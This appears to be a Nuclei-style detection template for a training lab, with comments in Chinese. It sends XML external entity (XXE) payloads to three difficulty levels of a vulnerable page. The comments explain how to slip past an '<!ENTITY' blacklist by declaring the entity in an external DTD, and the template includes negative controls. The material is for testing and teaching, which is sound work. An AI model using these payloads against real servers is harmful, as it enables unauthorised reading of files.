@@ -1,0 +1,187 @@
+id: vulnlab-xxe-external-entity
+
+info:
+  name: XXE（XML 外部实体注入读文件）
+  severity: high
+  author: hediwen
+  tags: [xxe, xml, entity-injection, file-read, injection]
+
+  description: |
+    XML 解析时启用了实体替换（`LIBXML_NOENT`）且未限制外部资源来源，
+    导致文档作者可以通过声明外部实体，让解析器去读取服务器上的文件。
+
+    ⚠️ 本检测是**只读**的 —— 只读取靶场自带的一个演示文件
+    （`html/xxe/xxe_probe.txt`，内容是固定标记串），
+    不写文件、不发起对外请求、不构造带外通道。
+    这是 XXE 类检测应该遵守的边界：证明「能读到不该读的」就够了。
+
+    ── 关于 Target 的说明 ──
+
+    本 PoC 的载荷使用**相对路径**的 SYSTEM 引用（`xxe_probe.txt`、
+    `attacker.dtd`），它们相对于**被请求脚本所在目录**解析 ——
+    也就是靶场的 `html/xxe/`。
+
+    这样写有两个好处：
+      · 不依赖绝对路径，换一台机器、换一个用户名都能用
+      · 不需要对外部 HTTP 服务器发起请求（`attacker.dtd` 就是仓库里的文件，
+        扮演「攻击者控制的 DTD」这一角色）
+
+    换句话说，**这个 PoC 可以在完全离线的环境里验证 XXE**。
+    真实场景下攻击者会用自己域名下的 DTD，但那会把检测变成「需要外网」，
+    对基准测试反而更不利。
+
+    ── 判据为什么必须限定在「订单号」字段里 ──
+
+    靶场页面会把提交的 XML 原样回显到输入框里。
+    如果判据写成「响应里出现标记串」，会**必然命中** ——
+    那是页面在展示我们提交的载荷，不是文件被读到了。
+
+    所以判据必须限定在解析结果那个字段里：
+
+        订单号：<b>...VULNLAB_XXE_PROBE_MARKER...</b>
+
+    这和命令注入场景「判据限定在命令输出区块内」是同一个思路：
+    **排除「检测特征被检测行为本身制造出来」的可能。**
+
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+    - https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
+
+requests:
+  # ── ① low 档：内联实体，零防护 ──────────────────────────────────
+  #
+  # 载荷结构：
+  #
+  #   <!DOCTYPE order [
+  #     <!ENTITY xxe SYSTEM "xxe_probe.txt">   ← 声明：这个实体指向那个文件
+  #   ]>
+  #   <order><id>&xxe;</id></order>            ← 引用：解析器把内容填在这里
+  #
+  # 应用随后读 `$order->id` 时，拿到的已经是文件内容了 ——
+  # 它根本不知道这个字段被「换」过一次。
+  - method: POST
+    path:
+      - "{{BaseURL}}/xxe/low.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "xml=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20order%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22xxe_probe.txt%22%3E%5D%3E%3Corder%3E%3Cid%3E%26xxe%3B%3C%2Fid%3E%3C%2Forder%3E"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      # 判据限定在「解析结果」的订单号字段内
+      - type: regex
+        part: body
+        regex:
+          - "订单号：<b>[^<]*VULNLAB_XXE_PROBE_MARKER"
+
+      # 反向保险：被拦 / 解析失败都不算命中
+      - type: word
+        part: body
+        words:
+          - "过滤器命中"
+          - "只接受纯数据 XML"
+          - "解析失败"
+        condition: or
+        negative: true
+
+    extractors:
+      - type: regex
+        part: body
+        name: leaked_content
+        regex:
+          - "订单号：<b>([^<]{0,80})"
+
+  # ── ② medium 档：实体声明挪到外部 DTD ───────────────────────────
+  #
+  # 该档用 `strpos($xml, '<!ENTITY')` 做黑名单 —— 方向是对的，
+  # 因为要利用 XXE 就必须声明一个实体。
+  #
+  # 但 **XML 的 DTD 有两个位置**：
+  #   · 内部子集（写在文档里）        → 过滤器检查的就是这里
+  #   · 外部子集（写在另一个文件里）  → 过滤器看不到
+  #
+  # 把声明挪到 `attacker.dtd`，请求体里就只剩一句 SYSTEM 引用 ——
+  # 一个 `<!ENTITY` 都没有，黑名单放行，
+  # 而解析器（开了 LIBXML_DTDLOAD）会把那份 DTD 拉下来照做。
+  #
+  # 一句话概括这个绕过：
+  # **过滤器检查的是「文档里写了什么」，
+  #   解析器执行的是「文档 + 它引用的所有外部资源」。**
+  - method: POST
+    path:
+      - "{{BaseURL}}/xxe/medium.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "xml=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20order%20SYSTEM%20%22attacker.dtd%22%3E%3Corder%3E%3Cid%3E%26xxe%3B%3C%2Fid%3E%3C%2Forder%3E"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: regex
+        part: body
+        regex:
+          - "订单号：<b>[^<]*VULNLAB_XXE_PROBE_MARKER"
+
+      - type: word
+        part: body
+        words: ["过滤器命中", "解析失败"]
+        condition: or
+        negative: true
+
+    extractors:
+      - type: regex
+        part: body
+        name: bypass_variant
+        regex:
+          - "DOCTYPE\\s+order\\s+SYSTEM"
+
+  # ── ③ low 档负向对照：正常订单不应命中 ──────────────────────────
+  #
+  # 这一条**不应该命中**，它的作用是把「读到文件」归因给 XXE 本身。
+  # 少了它，上面两条断言只证明了「某个请求让标记串出现了」，
+  # 分不清是实体被展开，还是页面本身就会输出那个文件的内容。
+  - method: POST
+    path:
+      - "{{BaseURL}}/xxe/low.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "xml=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Corder%3E%3Cid%3E1001%3C%2Fid%3E%3C%2Forder%3E"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: regex
+        part: body
+        regex:
+          - "订单号：<b>[^<]*VULNLAB_XXE_PROBE_MARKER"
+
+  # ── ④ high 档：修复对照（预期不命中）────────────────────────────
+  #
+  # high 档做了三层防护，其中第二层是「换掉外部实体加载器」——
+  # 它不检查输入，而是直接拿掉解析器「去外面取东西」的能力。
+  #
+  # 所以同一条 payload 打过去，无论走内部还是外部子集都读不到东西。
+  # 这一条如果命中了，说明 high 档的三层防护被改坏了。
+  - method: POST
+    path:
+      - "{{BaseURL}}/xxe/high.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "xml=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20order%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22xxe_probe.txt%22%3E%5D%3E%3Corder%3E%3Cid%3E%26xxe%3B%3C%2Fid%3E%3C%2Forder%3E"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: regex
+        part: body
+        regex:
+          - "订单号：<b>[^<]*VULNLAB_XXE_PROBE_MARKER"
